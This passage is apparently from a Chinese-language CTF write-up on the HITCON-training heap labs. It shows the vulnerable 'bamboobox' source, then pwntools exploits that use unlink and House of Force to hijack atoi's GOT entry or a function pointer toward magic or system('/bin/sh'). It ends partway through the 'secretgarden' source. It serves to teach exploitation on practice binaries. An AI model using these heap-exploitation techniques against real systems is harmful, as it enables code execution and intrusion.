class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> num ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hello_message</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;There is a box with magic&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;what do you want to do in the box&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">goodbye_message</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;See you next time&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Thanks you&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">box</span>&#123;</span></span><br><span class="line">	<span class="keyword">void</span> (*hello_message)();</span><br><span class="line">	<span class="keyword">void</span> (*goodbye_message)();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;----------------------------&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Bamboobox Menu&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;----------------------------&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;1.show the items in the box&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;2.add a new item&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;3.change the item in the box&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;4.remove the item in the box&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;5.exit&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;----------------------------&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Your choice:&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_item</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i ;</span><br><span class="line">	<span class="keyword">if</span>(!num)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;No item in the box&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">100</span>; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(itemlist[i].name)&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d : %s&quot;</span>,i,itemlist[i].name);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_item</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> sizebuf[<span class="number">8</span>] ;</span><br><span class="line">	<span class="keyword">int</span> length ;</span><br><span class="line">	<span class="keyword">int</span> i ;</span><br><span class="line">	<span class="keyword">int</span> size ;</span><br><span class="line">	<span class="keyword">if</span>(num &lt; <span class="number">100</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Please enter the length of item name:&quot;</span>);</span><br><span class="line">		read(<span class="number">0</span>,sizebuf,<span class="number">8</span>);</span><br><span class="line">		length = atoi(sizebuf);</span><br><span class="line">		<span class="keyword">if</span>(length == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;invaild length&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">100</span> ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(!itemlist[i].name)&#123;</span><br><span class="line">				itemlist[i].size = length ;</span><br><span class="line">				itemlist[i].name = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(length);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;Please enter the name of item:&quot;</span>);</span><br><span class="line">				size = read(<span class="number">0</span>,itemlist[i].name,length);</span><br><span class="line">				itemlist[i].name[size] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">				num++;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;the box is full&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_item</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> indexbuf[<span class="number">8</span>] ;</span><br><span class="line">	<span class="keyword">char</span> lengthbuf[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">int</span> length ;</span><br><span class="line">	<span class="keyword">int</span> index ;</span><br><span class="line">	<span class="keyword">int</span> readsize ;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!num)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;No item in the box&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Please enter the index of item:&quot;</span>);</span><br><span class="line">		read(<span class="number">0</span>,indexbuf,<span class="number">8</span>);</span><br><span class="line">		index = atoi(indexbuf);</span><br><span class="line">		<span class="keyword">if</span>(itemlist[index].name)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Please enter the length of item name:&quot;</span>);</span><br><span class="line">			read(<span class="number">0</span>,lengthbuf,<span class="number">8</span>);</span><br><span class="line">			length = atoi(lengthbuf);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Please enter the new name of the item:&quot;</span>);</span><br><span class="line">			readsize = read(<span class="number">0</span>,itemlist[index].name,length);</span><br><span class="line">			*(itemlist[index].name + readsize) = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;invaild index&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove_item</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> indexbuf[<span class="number">8</span>] ;</span><br><span class="line">	<span class="keyword">int</span> index ;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!num)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;No item in the box&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Please enter the index of item:&quot;</span>);</span><br><span class="line">		read(<span class="number">0</span>,indexbuf,<span class="number">8</span>);</span><br><span class="line">		index = atoi(indexbuf);</span><br><span class="line">		<span class="keyword">if</span>(itemlist[index].name)&#123;</span><br><span class="line">			<span class="built_in">free</span>(itemlist[index].name);</span><br><span class="line">			itemlist[index].name = <span class="number">0</span> ;</span><br><span class="line">			itemlist[index].size = <span class="number">0</span> ;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;remove successful!!&quot;</span>);</span><br><span class="line">			num-- ;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;invaild index&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">magic</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fd ;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">	fd = open(<span class="string">&quot;/home/bamboobox/flag&quot;</span>,O_RDONLY);</span><br><span class="line">	read(fd,buffer,<span class="keyword">sizeof</span>(buffer));</span><br><span class="line">	close(fd);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,buffer);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> choicebuf[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">int</span> choice;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">box</span> *<span class="title">bamboo</span> ;</span></span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	bamboo = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct box));</span><br><span class="line">	bamboo-&gt;hello_message = hello_message;</span><br><span class="line">	bamboo-&gt;goodbye_message = goodbye_message ;</span><br><span class="line">	bamboo-&gt;hello_message();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		menu();</span><br><span class="line">		read(<span class="number">0</span>,choicebuf,<span class="number">8</span>);</span><br><span class="line">		choice = atoi(choicebuf);</span><br><span class="line">		<span class="keyword">switch</span>(choice)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				show_item();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				add_item();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				change_item();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">				remove_item();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">				bamboo-&gt;goodbye_message();</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">&quot;invaild choice!!!&quot;</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>存在全局数组<code>itemlist</code>，第一种办法就是利用它进行unlink，劫持<code>atoi</code>到<code>magic</code>：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="number">0x6020c8</span></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">fd = ptr<span class="number">-0x18</span></span><br><span class="line">bk = ptr<span class="number">-0x10</span></span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0x81</span>,fd,bk,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>,<span class="number">0x80</span>,<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack to magic</span></span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(elf.sym[<span class="string">&#x27;magic&#x27;</span>]))</span><br><span class="line">sla(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br></pre></td></tr></table></figure>


<p>或者劫持到<code>system</code>也可以：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># OR hijack to system</span></span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27;0 : &#x27;</span>)</span><br><span class="line">atoi = uu64(ru(<span class="string">&#x27;2 :&#x27;</span>))</span><br><span class="line">system,binsh = ret2libc(atoi,<span class="string">&#x27;atoi&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(system))</span><br><span class="line">sla(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>第二种办法是House of Force。程序开头就<code>malloc</code>了<code>0x10</code>的<code>box</code>用来放两个函数，其中第二个会在退出时调用，我们只需要覆盖第二个函数为<code>magic</code>即可。先通过溢出修改top chunk大小为-1，然后计算<code>evil_size</code>：减去自身大小以及<code>box</code>的大小，再减去一个头部的大小即可。这种方法简单了很多。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x70</span>,flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>,<span class="number">0</span>,<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">evil_size = -(<span class="number">0x60</span>+<span class="number">0x10</span>) - (<span class="number">0x10</span>+<span class="number">0x10</span>) - <span class="number">0x10</span></span><br><span class="line">add(evil_size)</span><br><span class="line">add(<span class="number">0x10</span>,p64(elf.sym[<span class="string">&#x27;magic&#x27;</span>])*<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="lab12-secretgarden"><a href="#lab12-secretgarden" class="headerlink" title="lab12 - secretgarden"></a>lab12 - secretgarden</h2><p>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TIMEOUT 60</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">flower</span>&#123;</span></span><br><span class="line">	<span class="keyword">int</span> vaild ;</span><br><span class="line">	<span class="keyword">char</span> *name ;</span><br><span class="line">	<span class="keyword">char</span> color[<span class="number">24</span>] ;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">flower</span>* <span class="title">flowerlist</span>[100] ;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> flowercount = <span class="number">0</span> ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;☆         Baby Secret Garden      ☆ &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;  1 . Raise a flower &quot;</span> );</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;  2 . Visit the garden &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;  3 . Remove a flower from the garden&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;  4 . Clean the garden&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;  5 . Leave the garden&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Your choice : &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">flower</span> *<span class="title">newflower</span> =</span> <span class="literal">NULL</span> ;</span><br><span class="line">	<span class="keyword">char</span> *buf = <span class="literal">NULL</span> ;</span><br><span class="line">	<span class="keyword">unsigned</span> size =<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> index ;</span><br><span class="line">	<span class="keyword">if</span>(flowercount &lt; <span class="number">100</span>)&#123;</span><br><span class="line">		newflower = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct flower));</span><br><span class="line">		<span class="built_in">memset</span>(newflower,<span class="number">0</span>,<span class="keyword">sizeof</span>(struct flower));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Length of the name :&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%u&quot;</span>,&amp;size)== EOF) <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		buf = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(size);</span><br><span class="line">		<span class="keyword">if</span>(!buf)&#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;Alloca error !!&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;The name of flower :&quot;</span>);</span><br><span class="line">		read(<span class="number">0</span>,buf,size);</span><br><span class="line">		newflower-&gt;name = buf ;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;The color of the flower :&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%23s&quot;</span>,newflower-&gt;color);</span><br><span class="line">		newflower-&gt;vaild = <span class="number">1</span> ;</span><br><span class="line">		<span class="keyword">for</span>(index = <span class="number">0</span> ; index &lt; <span class="number">100</span> ; index++ )&#123;</span><br><span class="line">			<span class="keyword">if</span>(!flowerlist[index])&#123;</span><br><span class="line">				flowerlist[index] = newflower ;</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		flowercount++ ;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Successful !&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;The garden is overflow&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">del</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> index ;</span><br><span class="line">	<span class="keyword">if</span>(!flowercount)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;No flower in the garden&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Which flower do you want to remove from the garden:&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">		<span class="keyword">if</span>(index &lt; <span class="number">0</span> ||index &gt;= <span class="number">100</span> || !flowerlist[index])&#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">		(flowerlist[index])-&gt;vaild = <span class="number">0</span> ;</span><br><span class="line">		<span class="built_in">free</span>((flowerlist[index])-&gt;name);</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Successful&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">magic</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd ;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">    fd = open(<span class="string">&quot;/home/babysecretgarden/flag&quot;</span>,O_RDONLY);</span><br><span class="line">    read(fd,buffer,<span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,buffer);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clean</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> index ;</span><br><span class="line">	<span class="keyword">for</span>(index = <span class="number">0</span> ; index &lt; <span class="number">100</span> ; index++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(flowerlist[index] &amp;&amp; (flowerlist[index])-&gt;vaild == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">free</span>(flowerlist[index]);</span><br><span class="line">			flowerlist[index] = <span class="literal">NULL</span>;</span><br><span class="line">			flowercount--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">visit</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> index ;</span><br><span class="line">	<span class="keyword">if</span>(!flowercount)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;No flower in the garden !&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(index = <span class="number">0</span> ; index &lt; <span class="number">100</span> ; index++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(flowerlist[index] &amp;&amp; (flowerlist[index])-&gt;vaild)&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;Name of the flower[%u] :%s\n&quot;</span>,index,(flowerlist[index])-&gt;name);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;Color of the flower[%u] :%s\n&quot;</span>,index,(flowerlist[index])-&gt;color);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handler</span><span class="params">(<span class="keyword">int</span> signum)</span></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span 